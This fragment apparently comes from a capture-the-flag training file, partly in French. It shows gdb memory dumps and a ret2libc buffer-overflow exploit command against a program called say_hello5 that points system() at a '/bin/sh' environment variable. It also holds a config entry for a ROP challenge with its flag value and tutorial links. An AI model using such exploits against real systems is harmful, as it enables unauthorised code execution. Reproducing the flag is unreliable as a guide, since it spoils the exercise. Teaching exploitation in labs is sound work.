    0xffffded6:	"gv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;3"...
    0xffffdf9e:	"6:*.xspf=00;36:"
    0xffffdfae:	"NOTVISIBLE=in users profile"
    0xffffdfca:	"PWD=/home/zapp"
    0xffffdfd9:	"LINES=28"
    0xffffdfe2:	"/home/zapp/say_hello5"
    0xffffdff8:	""
    0xffffdff9:	""
    0xffffdffa:	""
    0xffffdffb:	""
    0xffffdffc:	""
    0xffffdffd:	""
    0xffffdffe:	""
    0xffffdfff:	""
    0xffffe000:	<error: Cannot access memory at address 0xffffe000>
    ```

    0xffffd9d4:	"MYSHELL=/bin/sh"
    0x8048370 <system@plt>
    0xf7e479d0 <__GI_exit>
    \x70\x83\x04\x08 \xd0\x79\xe4\xf7 \xd4\xd9\xff\xff
    '\x70\x83\x04\x08\xd0\x79\xe4\xf7\xd4\xd9\xff\xff'
    ./say_hello5 $(python -c "print '\x90'*(212-4)+'\x70\x83\x04\x08\xd0\x79\xe4\xf7\xd4\xd9\xff\xff'")

    En 64 bit, on n'utilise plus la pile, mais les registres. Il faut donc passer ces 3 adresses dans des registres.




[Challenge_overflow_rop]
name:  ROP
value: 50
file:  buffer_rop.c
category:  Buffer overflows
flag:  1012
description: 
    https://beta.hackndo.com/return-oriented-programming/
    https://www.dailysecurity.fr/return_oriented_programming/
    https://www.shadesec.com/exploitation/2017/01/12/rop-chain-tutorial.html